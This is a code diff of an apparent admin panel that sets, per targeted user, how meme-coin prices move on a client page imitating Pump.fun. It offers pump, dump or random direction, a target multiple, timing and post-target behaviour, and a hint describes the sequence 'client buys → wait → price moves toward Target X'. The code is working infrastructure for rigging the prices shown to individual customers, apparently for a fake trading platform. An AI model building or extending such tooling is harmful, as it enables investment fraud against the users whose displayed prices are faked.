@@ -19,7 +19,7 @@
       color: #fff; font-family: 'Plus Jakarta Sans', sans-serif;
       margin: 0; padding: 16px; padding-bottom: 40px;
     }
-    .container { max-width: 560px; margin: 0 auto; }
+    .container { max-width: 520px; margin: 0 auto; }
     h1 {
       margin: 0 0 8px; font-size: 1.3rem; font-weight: 800;
       background: linear-gradient(90deg, #f472b6, #a78bfa);
@@ -42,7 +42,8 @@
       background: var(--card-bg); border: 1px solid var(--card-border);
       border-radius: 16px; padding: 16px; margin-bottom: 12px;
     }
-    .card.locked { opacity: 0.75; pointer-events: none; }
+    .card.locked-fields input,
+    .card.locked-fields select { pointer-events: none; opacity: 0.85; }
     .card-title { font-size: 0.72rem; color: var(--muted); font-weight: 700; letter-spacing: 1px; text-transform: uppercase; margin: 0 0 12px; }
     .toggle-row { display: flex; justify-content: space-between; align-items: center; }
     .switch {
@@ -54,17 +55,12 @@
       background: #fff; border-radius: 50%; transition: 0.2s;
     }
     .switch.on::after { left: 25px; }
+    .switch.disabled { pointer-events: none; opacity: 0.85; }
     label { display: block; font-size: 0.72rem; color: var(--muted); font-weight: 700; text-transform: uppercase; margin-bottom: 5px; }
     select, input {
       width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1);
       color: #fff; padding: 11px; border-radius: 10px; margin-bottom: 10px; box-sizing: border-box;
     }
-    select:disabled, input:disabled { opacity: 0.85; }
-    .coin-ctrl {
-      border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px; margin-bottom: 10px;
-      background: rgba(0,0,0,0.2);
-    }
-    .coin-ctrl h4 { margin: 0 0 8px; font-size: 0.95rem; }
     .row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
     .btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 8px; }
     .btn-row.one { grid-template-columns: 1fr; }
@@ -78,7 +74,15 @@
       color: #e2e8f0; padding: 14px; border-radius: 12px; font-weight: 700; width: 100%; cursor: pointer;
     }
     .status { text-align: center; font-size: 0.85rem; font-weight: 600; margin-top: 10px; min-height: 20px; }
-    .hint { font-size: 0.75rem; color: var(--muted); line-height: 1.4; }
+    .hint { font-size: 0.75rem; color: var(--muted); line-height: 1.45; margin: 0 0 10px; }
+    .saved-badge {
+      display: inline-block; font-size: 0.7rem; font-weight: 700; padding: 3px 8px; border-radius: 20px;
+      background: rgba(16,185,129,0.15); color: #34d399; border: 1px solid rgba(16,185,129,0.35);
+    }
+    .unsaved-badge {
+      display: inline-block; font-size: 0.7rem; font-weight: 700; padding: 3px 8px; border-radius: 20px;
+      background: rgba(148,163,184,0.15); color: #94a3b8; border: 1px solid rgba(148,163,184,0.3);
+    }
   </style>
 </head>
 <body>
@@ -87,47 +91,78 @@
     <a class="back" id="back-link" href="#">← Back to User Info</a>
 
     <div class="lock-banner" id="lock-banner">
-      <div class="msg" id="lock-msg">🔒 Controls locked. Tap Edit to change.</div>
-      <button class="edit-btn" onclick="enterEdit()">Edit</button>
+      <div class="msg" id="lock-msg">🔒 Locked. Select a coin, then Edit to change its rules.</div>
+      <button class="edit-btn" id="edit-btn" onclick="enterEdit()">Edit</button>
     </div>
 
-    <div class="card locked" id="card-master">
+    <div class="card" id="card-master">
       <div class="card-title">Master</div>
       <div class="toggle-row">
-        <span style="font-weight:600">Enable price control for this user</span>
-        <div class="switch" id="master" onclick="toggleMaster()"></div>
+        <span style="font-weight:600">Enable pump control for this user</span>
+        <div class="switch disabled" id="master" onclick="toggleMaster()"></div>
       </div>
-      <p class="hint" style="margin-top:10px">When ON, selected meme coins move according to the rules below on the client Pump.fun page.</p>
+      <p class="hint" style="margin-top:10px">When ON, coins follow the rules you save below on the client Pump.fun page.</p>
     </div>
 
-    <div class="card locked" id="card-default">
-      <div class="card-title">Default rule (all coins without custom rule)</div>
-      <label>Direction</label>
-      <select id="def-dir" disabled>
-        <option value="up">Pump up</option>
-        <option value="down">Dump down</option>
+    <div class="card" id="card-select">
+      <div class="card-title">Select coin</div>
+      <label>Coin</label>
+      <select id="coin-select" onchange="onCoinChange()"></select>
+      <p class="hint">Popular coins and any coins users created appear here. Pick one, Edit, set rules, Save. Rules stay until you edit that coin again.</p>
+      <div id="coin-status"></div>
+    </div>
+
+    <div class="card locked-fields" id="card-rules">
+      <div class="card-title">Rules for selected coin</div>
+
+      <div class="toggle-row" style="margin-bottom:12px">
+        <span style="font-weight:600;font-size:0.9rem">Custom rule for this coin</span>
+        <div class="switch disabled" id="coin-enabled" onclick="toggleCoinEnabled()"></div>
+      </div>
+
+      <label>Direction (move)</label>
+      <select id="direction" disabled>
+        <option value="up">Go up (pump)</option>
+        <option value="down">Go down (dump)</option>
         <option value="random">Random</option>
       </select>
+
       <div class="row2">
         <div>
-          <label>Target %</label>
-          <input type="number" id="def-pct" value="8" min="0.1" max="500" step="0.1" disabled>
+          <label>Target move (X)</label>
+          <input type="number" id="target-x" min="0.1" max="100" step="0.1" value="2" disabled>
+          <p class="hint">e.g. 2 = 2× (100% gain), 0.5 = half</p>
         </div>
         <div>
-          <label>Speed (1–20)</label>
-          <input type="number" id="def-speed" value="3" min="1" max="20" step="1" disabled>
+          <label>Reach in (minutes)</label>
+          <input type="number" id="duration" min="0.5" max="240" step="0.5" value="5" disabled>
         </div>
       </div>
-    </div>
 
-    <div class="card locked" id="card-coins">
-      <div class="card-title">Per-coin overrides</div>
-      <div id="coin-list"></div>
+      <div class="row2">
+        <div>
+          <label>Start after (minutes)</label>
+          <input type="number" id="start-after" min="0" max="120" step="0.5" value="0" disabled>
+        </div>
+        <div>
+          <label>After target behavior</label>
+          <select id="after" disabled>
+            <option value="static">Stay static</option>
+            <option value="drop">Drop / reverse</option>
+            <option value="grow">Keep pumping randomly</option>
+            <option value="dump">Keep dumping randomly</option>
+          </select>
+        </div>
+      </div>
+
+      <p class="hint">
+        Timeline: client buys → wait <b>Start after</b> → price moves toward <b>Target X</b> over <b>Reach in</b> minutes → then <b>After target</b> behavior.
+      </p>
     </div>
 
     <div class="btn-row one" id="btn-row">
       <button class="cancel-btn" id="cancel-btn" style="display:none" onclick="cancelEdit()">Cancel</button>
-      <button class="save-btn" id="save-btn" disabled onclick="save()">Save Pump Controls</button>
+      <button class="save-btn" id="save-btn" disabled onclick="save()">Save this coin</button>
     </div>
     <div class="status" id="status"></div>
   </div>
@@ -138,117 +173,217 @@
     var targetUserId = new URLSearchParams(location.search).get('id') || '';
     document.getElementById('back-link').href = 'user-info.html?id=' + encodeURIComponent(targetUserId);
 
-    var POPULAR = ['PEPE','DOGE','SHIB','BONK','WIF','FLOKI','BRETT','POPCAT','NEIRO','MEME'];
-    var enabled = false;
+    var POPULAR = [
+      { id: 'PEPE', name: 'Pepe' },
+      { id: 'DOGE', name: 'Dogecoin' },
+      { id: 'SHIB', name: 'Shiba Inu' },
+      { id: 'BONK', name: 'Bonk' },
+      { id: 'WIF', name: 'dogwifhat' },
+      { id: 'FLOKI', name: 'Floki' },
+      { id: 'BRETT', name: 'Brett' },
+      { id: 'POPCAT', name: 'Popcat' },
+      { id: 'NEIRO', name: 'Neiro' },
+      { id: 'MEME', name: 'Memecoin' }
+    ];
+
+    var masterOn = false;
     var isEditing = false;
+    var allCoins = [];
+    var controls = { enabled: false, coins: {} };
     var snapshot = null;
-    var coinRules = {};
+    var currentId = '';
+
+    function defaultRule() {
+      return {
+        enabled: true,
+        direction: 'up',
+        targetX: 2,
+        durationMin: 5,
+        startAfterMin: 0,
+        afterBehavior: 'static'
+      };
+    }
+
+    function loadCoinList() {
+      var map = {};
+      POPULAR.forEach(function (c) { map[c.id] = { id: c.id, name: c.name, created: false }; });
+      try {
+        var stored = JSON.parse(localStorage.getItem('pump_fun_coins_v1') || '[]');
+        if (Array.isArray(stored)) {
+          stored.forEach(function (c) {
+            if (!c || !c.id) return;
+            map[c.id] = {
+              id: c.id,
+              name: c.name || c.symbol || c.id,
+              created: !!c.createdBy
+            };
+          });
+        }
+      } catch (e) {}
+      // also surface any keys already in saved controls
+      Object.keys(controls.coins || {}).forEach(function (id) {
+        if (!map[id]) map[id] = { id: id, name: id, created: true };
+      });
+      allCoins = Object.keys(map).map(function (k) { return map[k]; });
+      allCoins.sort(function (a, b) {
+        if (a.created !== b.created) return a.created ? 1 : -1;
+        return a.id.localeCompare(b.id);
+      });
+
+      var sel = document.getElementById('coin-select');
+      var prev = currentId || (allCoins[0] && allCoins[0].id) || '';
+      sel.innerHTML = allCoins.map(function (c) {
+        var tag = c.created ? ' (user)' : '';
+        return '<option value="' + c.id + '">' + c.id + ' — ' + c.name + tag + '</option>';
+      }).join('');
+      if (prev && map[prev]) sel.value = prev;
+      currentId = sel.value;
+      fillFormFromRule();
+    }
+
+    function getRule(id) {
+      var r = (controls.coins && controls.coins[id]) || null;
+      return r ? JSON.parse(JSON.stringify(r)) : defaultRule();
+    }
+
+    function fillFormFromRule() {
+      var r = getRule(currentId);
+      document.getElementById('coin-enabled').classList.toggle('on', !!r.enabled);
+      document.getElementById('direction').value = r.direction || 'up';
+      document.getElementById('target-x').value = r.targetX != null ? r.targetX : 2;
+      document.getElementById('duration').value = r.durationMin != null ? r.durationMin : 5;
+      document.getElementById('start-after').value = r.startAfterMin != null ? r.startAfterMin : 0;
+      document.getElementById('after').value = r.afterBehavior || 'static';
+      var has = controls.coins && controls.coins[currentId];
+      document.getElementById('coin-status').innerHTML = has
+        ? '<span class="saved-badge">Saved rules for ' + currentId + '</span>'
+        : '<span class="unsaved-badge">Using defaults until you save</span>';
+    }
+
+    function readFormRule() {
+      return {
+        enabled: document.getElementById('coin-enabled').classList.contains('on'),
+        direction: document.getElementById('direction').value,
+        targetX: parseFloat(document.getElementById('target-x').value) || 2,
+        durationMin: parseFloat(document.getElementById('duration').value) || 5,
+        startAfterMin: parseFloat(document.getElementById('start-after').value) || 0,
+        afterBehavior: document.getElementById('after').value || 'static'
+      };
+    }
 
     function setLocked(locked) {
       isEditing = !locked;
-      ['card-master','card-default','card-coins'].forEach(function (id) {
-        document.getElementById(id).classList.toggle('locked', locked);
-      });
-      ['def-dir','def-pct','def-speed'].forEach(function (id) {
+      document.getElementById('master').classList.toggle('disabled', locked);
+      document.getElementById('coin-enabled').classList.toggle('disabled', locked);
+      ['direction', 'target-x', 'duration', 'start-after', 'after'].forEach(function (id) {
         document.getElementById(id).disabled = locked;
       });
-      document.getElementById('lock-banner').classList.toggle('unlocked', !locked);
+      // coin select always available so admin can switch coins while locked
+      document.getElementById('card-rules').classList.toggle('locked-fields', locked);
+
+      var banner = document.getElementById('lock-banner');
+      banner.classList.toggle('unlocked', !locked);
       document.getElementById('lock-msg').textContent = locked
-        ? '🔒 Controls locked. Tap Edit to change.'
-        : '✏️ Editing — change then Save.';
+        ? '🔒 Locked. Select a coin, then Edit to change its rules.'
+        : '✏️ Editing ' + currentId + ' — Save when done.';
       document.getElementById('save-btn').disabled = locked;
       document.getElementById('cancel-btn').style.display = locked ? 'none' : 'block';
       document.getElementById('btn-row').className = locked ? 'btn-row one' : 'btn-row';
-      renderCoins();
     }
 
     function toggleMaster() {
       if (!isEditing) return;
-      enabled = !enabled;
-      document.getElementById('master').classList.toggle('on', enabled);
+      masterOn = !masterOn;
+      document.getElementById('master').classList.toggle('on', masterOn);
+    }
+
+    function toggleCoinEnabled() {
+      if (!isEditing) return;
+      document.getElementById('coin-enabled').classList.toggle('on');
+    }
+
+    function onCoinChange() {
+      if (isEditing) {
+        // don't lose mid-edit without cancel — auto cancel to selected new coin
+        cancelEdit();
+      }
+      currentId = document.getElementById('coin-select').value;
+      fillFormFromRule();
+      document.getElementById('status').textContent = '';
     }
 
     function enterEdit() {
-      snapshot = JSON.parse(JSON.stringify({
-        enabled: enabled,
-        defDir: document.getElementById('def-dir').value,
-        defPct: document.getElementById('def-pct').value,
-        defSpeed: document.getElementById('def-speed').value,
-        coinRules: coinRules
-      }));
+      snapshot = {
+        masterOn: masterOn,
+        controls: JSON.parse(JSON.stringify(controls)),
+        form: readFormRule(),
+        coinId: currentId
+      };
       setLocked(false);
       document.getElementById('status').textContent = '';
     }
 
     function cancelEdit() {
       if (snapshot) {
-        enabled = snapshot.enabled;
-        document.getElementById('master').classList.toggle('on', enabled);
-        document.getElementById('def-dir').value = snapshot.defDir;
-        document.getElementById('def-pct').value = snapshot.defPct;
-        document.getElementById('def-speed').value = snapshot.defSpeed;
-        coinRules = JSON.parse(JSON.stringify(snapshot.coinRules));
+        masterOn = snapshot.masterOn;
+        controls = JSON.parse(JSON.stringify(snapshot.controls));
+        document.getElementById('master').classList.toggle('on', masterOn);
+        if (snapshot.coinId === currentId) {
+          var f = snapshot.form;
+          document.getElementById('coin-enabled').classList.toggle('on', !!f.enabled);
+          document.getElementById('direction').value = f.direction;
+          document.getElementById('target-x').value = f.targetX;
+          document.getElementById('duration').value = f.durationMin;
+          document.getElementById('start-after').value = f.startAfterMin;
+          document.getElementById('after').value = f.afterBehavior;
+        } else {
+          fillFormFromRule();
+        }
       }
       setLocked(true);
+      document.getElementById('status').textContent = '';
     }
 
-    function renderCoins() {
-      // merge popular + any from localStorage global coins
-      var extra = [];
+    async function save() {
+      if (!isEditing || !targetUserId) {
+        document.getElementById('status').textContent = 'Open from a user.';
+        return;
+      }
+      currentId = document.getElementById('coin-select').value;
+      if (!controls.coins) controls.coins = {};
+      controls.coins[currentId] = readFormRule();
+      controls.enabled = masterOn;
+      controls.updatedAt = Date.now();
+
+      var st = document.getElementById('status');
+      var btn = document.getElementById('save-btn');
+      btn.disabled = true;
+      btn.textContent = 'Saving…';
+
+      localStorage.setItem('pump_control_' + targetUserId, JSON.stringify(controls));
+
+      var ok = false;
       try {
-        var all = JSON.parse(localStorage.getItem('pump_fun_coins_v1') || '[]');
-        all.forEach(function (c) {
-          if (c && c.id && POPULAR.indexOf(c.id) < 0 && extra.indexOf(c.id) < 0) extra.push(c.id);
-        });
-      } catch (e) {}
-      var ids = POPULAR.concat(extra);
-      document.getElementById('coin-list').innerHTML = ids.map(function (id) {
-        var r = coinRules[id] || { enabled: false, direction: 'up', targetPct: 10, speed: 3 };
-        var dis = isEditing ? '' : 'disabled';
-        return '<div class="coin-ctrl"><h4>' + id + '</h4>' +
-          '<div class="toggle-row" style="margin-bottom:8px">' +
-          '<span style="font-size:0.85rem">Custom rule</span>' +
-          '<div class="switch ' + (r.enabled ? 'on' : '') + '" data-id="' + id + '" onclick="toggleCoin(this)"></div></div>' +
-          '<div class="row2"><div><label>Direction</label>' +
-          '<select data-f="direction" data-id="' + id + '" ' + dis + ' onchange="updCoin(this)">' +
-          '<option value="up"' + (r.direction==='up'?' selected':'') + '>Pump up</option>' +
-          '<option value="down"' + (r.direction==='down'?' selected':'') + '>Dump down</option>' +
-          '<option value="random"' + (r.direction==='random'?' selected':'') + '>Random</option>' +
-          '</select></div><div><label>Target %</label>' +
-          '<input type="number" data-f="targetPct" data-id="' + id + '" value="' + (r.targetPct||10) + '" ' + dis + ' onchange="updCoin(this)"></div></div>' +
-          '<label>Speed</label><input type="number" data-f="speed" data-id="' + id + '" value="' + (r.speed||3) + '" min="1" max="20" ' + dis + ' onchange="updCoin(this)">' +
-          '</div>';
-      }).join('');
-    }
+        var { error } = await client.from('profiles').update({ pump_control: controls }).eq('id', targetUserId);
+        if (!error) ok = true;
+        else {
+          st.style.color = '#fbbf24';
+          st.textContent = 'Saved locally. DB: ' + error.message;
+        }
+      } catch (e) {
+        st.style.color = '#fbbf24';
+        st.textContent = 'Saved locally only.';
+      }
 
-    function toggleCoin(el) {
-      if (!isEditing) return;
-      var id = el.getAttribute('data-id');
-      if (!coinRules[id]) coinRules[id] = { enabled: false, direction: 'up', targetPct: 10, speed: 3 };
-      coinRules[id].enabled = !coinRules[id].enabled;
-      el.classList.toggle('on', coinRules[id].enabled);
-    }
+      btn.disabled = false;
+      btn.textContent = 'Save this coin';
 
-    function updCoin(el) {
-      if (!isEditing) return;
-      var id = el.getAttribute('data-id');
-      var f = el.getAttribute('data-f');
-      if (!coinRules[id]) coinRules[id] = { enabled: true, direction: 'up', targetPct: 10, speed: 3 };
-      var v = el.value;
-      if (f === 'targetPct' || f === 'speed') v = parseFloat(v) || 0;
-      coinRules[id][f] = v;
-    }
-
-    function apply(c) {
-      if (!c) return;
-      enabled = !!c.enabled;
-      document.getElementById('master').classList.toggle('on', enabled);
-      var d = c.default || {};
-      document.getElementById('def-dir').value = d.direction || 'up';
-      document.getElementById('def-pct').value = d.targetPct != null ? d.targetPct : 8;
-      document.getElementById('def-speed').value = d.speed != null ? d.speed : 3;
-      coinRules = c.coins ? JSON.parse(JSON.stringify(c.coins)) : {};
-      renderCoins();
+      if (ok) {
+        st.style.color = '#34d399';
+        st.textContent = 'Saved rules for ' + currentId + ' & locked.';
+        fillFormFromRule();
+        setLocked(true);
+      }
     }
 
     async function load() {
@@ -257,59 +392,40 @@
           var { data } = await client.from('profiles').select('pump_control').eq('id', targetUserId).maybeSingle();
           if (data && data.pump_control) {
             var c = typeof data.pump_control === 'string' ? JSON.parse(data.pump_control) : data.pump_control;
-            apply(c);
-            localStorage.setItem('pump_control_' + targetUserId, JSON.stringify(c));
-            setLocked(true);
-            return;
+            controls = c || { enabled: false, coins: {} };
+            if (!controls.coins) controls.coins = {};
+            // migrate old shape (targetPct/speed) if present
+            Object.keys(controls.coins).forEach(function (id) {
+              var r = controls.coins[id];
+              if (r.targetX == null && r.targetPct != null) {
+                r.targetX = 1 + (Number(r.targetPct) || 0) / 100;
+              }
+              if (r.durationMin == null) r.durationMin = 5;
+              if (r.startAfterMin == null) r.startAfterMin = 0;
+              if (!r.afterBehavior) r.afterBehavior = 'static';
+            });
+            localStorage.setItem('pump_control_' + targetUserId, JSON.stringify(controls));
           }
         } catch (e) {}
       }
-      try {
-        var raw = localStorage.getItem('pump_control_' + targetUserId);
-        if (raw) apply(JSON.parse(raw));
-        else renderCoins();
-      } catch (e) { renderCoins(); }
+      if (!controls.coins) {
+        try {
+          var raw = localStorage.getItem('pump_control_' + targetUserId);
+          if (raw) controls = JSON.parse(raw);
+        } catch (e) {}
+      }
+      if (!controls.coins) controls = { enabled: false, coins: {} };
+
+      masterOn = !!controls.enabled;
+      document.getElementById('master').classList.toggle('on', masterOn);
+      loadCoinList();
       setLocked(true);
     }
 
-    async function save() {
-      if (!isEditing || !targetUserId) {
-        document.getElementById('status').textContent = 'Open from a user.';
-        return;
-      }
-      var controls = {
-        enabled: enabled,
-        default: {
-          direction: document.getElementById('def-dir').value,
-          targetPct: parseFloat(document.getElementById('def-pct').value) || 8,
-          speed: parseFloat(document.getElementById('def-speed').value) || 3
-        },
-        coins: coinRules,
-        updatedAt: Date.now()
-      };
-      var st = document.getElementById('status');
-      var btn = document.getElementById('save-btn');
-      btn.disabled = true;
-      btn.textContent = 'Saving…';
-      localStorage.setItem('pump_control_' + targetUserId, JSON.stringify(controls));
-      var ok = false;
-      try {
-        var { error } = await client.from('profiles').update({ pump_control: controls }).eq('id', targetUserId);
-        if (!error) ok = true;
-        else st.textContent = 'Local save. DB: ' + error.message;
-      } catch (e) {
-        st.textContent = 'Saved locally only.';
-      }
-      btn.disabled = false;
-      btn.textContent = 'Save Pump Controls';
-      if (ok) {
-        st.style.color = '#34d399';
-        st.textContent = 'Saved & locked.';
-        setLocked(true);
-      } else {
-        st.style.color = '#fbbf24';
-      }
-    }
+    // refresh coin list periodically so new user coins appear
+    setInterval(function () {
+      if (!isEditing) loadCoinList();
+    }, 8000);
 
     load();
   </script>
